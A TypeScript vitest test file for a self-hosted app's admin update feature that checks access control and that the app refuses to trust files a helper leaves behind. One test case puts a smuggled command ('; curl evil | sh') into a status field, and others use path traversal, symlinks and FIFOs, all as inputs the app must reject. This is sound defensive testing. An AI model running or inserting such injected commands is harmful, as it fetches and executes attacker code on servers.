import { execFileSync } from 'node:child_process';
import { lstat, mkdir, readdir, readFile, rm, symlink, utimes, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { addMember, Client, createTestEnv, setupAdmin, type TestEnv } from './helpers';

const NOTES = `## v0.8.0 (2026-10-10)

### New

- **Updates:** install new versions from
  Admin → Overview.

### Before you update

- Set \`AUTO_UPDATE=yes\` in \`deploy/.env\`.
`;

let env: TestEnv;
let admin: Client;
let member: Client;
let dir: string;

/** What update.sh --cron leaves in cache/updates, as it writes it. */
function hostStatus(over: Record<string, unknown> = {}) {
  const now = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
  return {
    format: 1,
    channel: 'stable',
    checkout: '/home/fam/familycloud',
    timezone: 'Etc/UTC',
    auto: true,
    nextAutoAt: '2026-10-09T04:30:00Z',
    triedAt: now,
    checkedAt: now,
    problem: null,
    latest: 'v0.8.0',
    ready: true,
    manualSteps: false,
    failedVersion: null,
    state: 'idle',
    phase: null,
    from: null,
    to: null,
    at: null,
    reason: null,
    trigger: null,
    ...over,
  };
}
async function helperLeft(over: Record<string, unknown> = {}, files: Record<string, string> = {}) {
  await mkdir(dir, { recursive: true });
  await writeFile(path.join(dir, 'status.json'), JSON.stringify(hostStatus(over)));
  await writeFile(path.join(dir, 'notes.md'), NOTES);
  for (const [name, text] of Object.entries(files)) await writeFile(path.join(dir, name), text);
}
const requests = async () =>
  (await readdir(dir).catch(() => [])).filter((n) => n.startsWith('request-')).sort();

beforeAll(async () => {
  env = await createTestEnv({ APP_VERSION: 'v0.7.0' });
  dir = path.join(env.dataDir, 'cache', 'updates');
  admin = (await setupAdmin(env)).client;
  member = (await addMember(env, admin, 'kid@example.com')).client;
});
afterAll(() => env.close());
beforeEach(() => rm(dir, { recursive: true, force: true }));

describe('updates in Admin → Overview', () => {
  it('are for admins only', async () => {
    await helperLeft();
    expect((await new Client(env.app).get('/admin/updates')).status).toBe(401);
    expect((await member.get('/admin/updates')).status).toBe(403);
    expect((await member.post('/admin/updates/check')).status).toBe(403);
    expect((await member.post('/admin/updates/install', { version: 'v0.8.0' })).status).toBe(403);
    expect(
      (await member.req('PUT', '/admin/updates/auto', { json: { enabled: false } })).status,
    ).toBe(403);
    expect(await requests()).toEqual([]);
  });

  it('say when the update helper isn’t set up, and ask nothing of it', async () => {
    const res = await admin.get('/admin/updates');
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({
      running: 'v0.7.0',
      updater: 'missing',
      available: null,
      last: null,
      auto: { enabled: false, nextAt: null },
    });
    for (const send of [
      () => admin.post('/admin/updates/check'),
      () => admin.post('/admin/updates/install', { version: 'v0.8.0' }),
      () => admin.req('PUT', '/admin/updates/auto', { json: { enabled: true } }),
    ]) {
      const refused = await send();
      expect(refused.status).toBe(409);
      expect(refused.body.code).toBe('UPDATER_MISSING');
    }
    expect(await requests()).toEqual([]);
  });

  it('show a newer version with what’s new in it, steps for whoever runs the server included', async () => {
    await helperLeft();
    const { body } = await admin.get('/admin/updates');
    expect(body).toMatchObject({
      updater: 'ok',
      channel: 'stable',
      checkout: '/home/fam/familycloud',
      auto: { enabled: true, nextAt: '2026-10-09T04:30:00Z', timezone: 'Etc/UTC' },
      available: { version: 'v0.8.0', manualSteps: false, ready: true, failedBefore: false },
      pending: { check: false, install: null, auto: null },
    });
    expect(body.available.releases).toEqual([
      {
        version: 'v0.8.0',
        date: '2026-10-10',
        groups: [
          { title: 'New', items: ['**Updates:** install new versions from Admin → Overview.'] },
          { title: 'Before you update', items: ['Set `AUTO_UPDATE=yes` in `deploy/.env`.'] },
        ],
      },
    ]);
  });

  it('ask the helper to install the newest version, once', async () => {
    await helperLeft();
    const res = await admin.post('/admin/updates/install', { version: 'v0.8.0' });
    expect(res.status).toBe(200);
    expect(res.body.pending.install).toBe('v0.8.0');
    // The name is the whole request: an empty, regular file.
    expect(await requests()).toEqual(['request-update-v0.8.0']);
    const file = path.join(dir, 'request-update-v0.8.0');
    expect((await lstat(file)).isFile()).toBe(true);
    expect(await readFile(file, 'utf8')).toBe('');
    expect(await readdir(dir)).not.toContainEqual(expect.stringMatching(/^\./));

    const again = await admin.post('/admin/updates/install', { version: 'v0.8.0' });
    expect(again.status).toBe(409);
    expect(again.body.code).toBe('UPDATE_IN_PROGRESS');

    const log = await admin.get('/admin/audit');
    expect(log.body.items[0]).toMatchObject({
      action: 'admin.update_requested',
      meta: { version: 'v0.8.0' },
    });
  });

  it('refuse a version the helper wouldn’t install', async () => {
    const cases: [Record<string, unknown>, string, string][] = [
      [{}, 'v0.7.5', 'UPDATE_UNAVAILABLE'],
      [{ manualSteps: true }, 'v0.8.0', 'UPDATE_UNAVAILABLE'],
      [{ ready: false }, 'v0.8.0', 'UPDATE_UNAVAILABLE'],
      [{ problem: 'local-changes' }, 'v0.8.0', 'UPDATE_UNAVAILABLE'],
      [{ latest: 'v0.7.0' }, 'v0.7.0', 'UPDATE_UNAVAILABLE'],
      [
        { state: 'updating', phase: 'backup', to: 'v0.8.0', at: hostStatus().triedAt },
        'v0.8.0',
        'UPDATE_IN_PROGRESS',
      ],
    ];
    for (const [over, version, code] of cases) {
      await rm(dir, { recursive: true, force: true });
      await helperLeft(over);
      const res = await admin.post('/admin/updates/install', { version });
      expect([res.status, res.body.code], JSON.stringify(over)).toEqual([409, code]);
      expect(await requests()).toEqual([]);
    }
    const bad = await admin.post('/admin/updates/install', { version: '../../etc' });
    expect(bad.status).toBe(400);
  });

  it('turn automatic updates on and off, and check now', async () => {
    await helperLeft({ auto: false });
    const on = await admin.req('PUT', '/admin/updates/auto', { json: { enabled: true } });
    expect(on.body.pending.auto).toBe(true);
    expect(await requests()).toEqual(['request-auto-on']);
    const off = await admin.req('PUT', '/admin/updates/auto', { json: { enabled: false } });
    expect(off.body.pending.auto).toBe(false);
    expect(await requests()).toEqual(['request-auto-off']);

    const check = await admin.post('/admin/updates/check');
    expect(check.body.pending.check).toBe(true);
    expect(await requests()).toEqual(['request-auto-off', 'request-check']);

    const log = await admin.get('/admin/audit');
    expect(log.body.items[0]).toMatchObject({
      action: 'admin.auto_update_changed',
      meta: { enabled: false },
    });
  });

  it('notice a helper that has stopped answering', async () => {
    const old = new Date(Date.now() - 14 * 3600_000).toISOString();
    await helperLeft({ triedAt: old, checkedAt: old });
    expect((await admin.get('/admin/updates')).body.updater).toBe('not-responding');

    await rm(dir, { recursive: true, force: true });
    await helperLeft();
    await admin.post('/admin/updates/check');
    const fourMinutesAgo = new Date(Date.now() - 4 * 60_000);
    await utimes(path.join(dir, 'request-check'), fourMinutesAgo, fourMinutesAgo);
    expect((await admin.get('/admin/updates')).body.updater).toBe('not-responding');
    // Not while it's busy updating: the request goes once the update is over.
    const at = hostStatus().triedAt;
    await writeFile(
      path.join(dir, 'status.json'),
      JSON.stringify(hostStatus({ state: 'updating', phase: 'download', to: 'v0.8.0', at })),
    );
    expect((await admin.get('/admin/updates')).body.updater).toBe('ok');
  });

  it('show how the last update went, with the end of its output when it failed', async () => {
    const at = hostStatus().triedAt;
    await helperLeft(
      {
        state: 'rolled-back',
        from: 'v0.7.0',
        to: 'v0.8.0',
        at,
        trigger: 'auto',
        failedVersion: 'v0.8.0',
      },
      { 'update.log': 'Getting v0.8.0\n\nGoing back to v0.7.0\n' },
    );
    const { body } = await admin.get('/admin/updates');
    expect(body.last).toEqual({
      state: 'rolled-back',
      phase: null,
      from: 'v0.7.0',
      to: 'v0.8.0',
      at,
      reason: null,
      trigger: 'auto',
      log: ['Getting v0.8.0', 'Going back to v0.7.0'],
    });
    expect(body.available.failedBefore).toBe(true);

    // Too slow to answer in time, but it got there in the end: that one worked.
    await rm(dir, { recursive: true, force: true });
    await helperLeft(
      { state: 'failed', reason: 'start', from: 'v0.6.0', to: 'v0.7.0', at, latest: null },
      { 'update.log': 'The app did not become healthy\n' },
    );
    expect((await admin.get('/admin/updates')).body.last).toMatchObject({
      state: 'done',
      reason: null,
      log: [],
    });
  });
});

describe('what the helper leaves is never trusted', () => {
  // The worker can write to cache/updates too (same mount, same user).
  const elsewhere = () => path.join(env.dataDir, 'elsewhere.json');

  it('ignores a status that is a link, too big, a folder or not as update.sh writes it', async () => {
    await mkdir(dir, { recursive: true });
    await writeFile(elsewhere(), JSON.stringify(hostStatus()));
    await symlink(elsewhere(), path.join(dir, 'status.json'));
    expect((await admin.get('/admin/updates')).body.updater).toBe('missing');

    for (const status of [
      JSON.stringify({ ...hostStatus(), padding: 'x'.repeat(2 * 1024 * 1024) }),
      JSON.stringify(hostStatus({ state: 'exploded' })),
      JSON.stringify(hostStatus({ latest: '../x' })),
      JSON.stringify(hostStatus({ checkout: '/home/fam/familycloud; curl evil | sh' })),
      '{"format":1',
    ]) {
      await rm(dir, { recursive: true, force: true });
      await mkdir(dir, { recursive: true });
      await writeFile(path.join(dir, 'status.json'), status);
      expect((await admin.get('/admin/updates')).body.updater).toBe('missing');
    }

    await rm(dir, { recursive: true, force: true });
    await mkdir(path.join(dir, 'status.json'), { recursive: true });
    const res = await admin.get('/admin/updates');
    expect(res.status).toBe(200);
    expect(res.body.updater).toBe('missing');
  });

  it('never waits on a FIFO or reads through a link for the notes and the log', async () => {
    await helperLeft({ state: 'failed', reason: 'build', to: 'v0.8.0', at: hostStatus().triedAt });
    await rm(path.join(dir, 'notes.md'));
    execFileSync('mkfifo', [path.join(dir, 'notes.md')]);
    await writeFile(elsewhere(), 'SECRET_KEY=from-somewhere-else\n');
    await symlink(elsewhere(), path.join(dir, 'update.log'));
    const { body } = await admin.get('/admin/updates');
    expect(body.available.releases).toEqual([]);
    expect(body.last.log).toEqual([]);
  });

  it('writes requests as new files, never through a link someone put in their place', async () => {
    await helperLeft();
    await writeFile(elsewhere(), 'keep me');
    await symlink(elsewhere(), path.join(dir, 'request-check'));
    expect((await admin.post('/admin/updates/check')).status).toBe(200);
    expect(await readFile(elsewhere(), 'utf8')).toBe('keep me');
    expect((await lstat(path.join(dir, 'request-check'))).isFile()).toBe(true);
  });
});
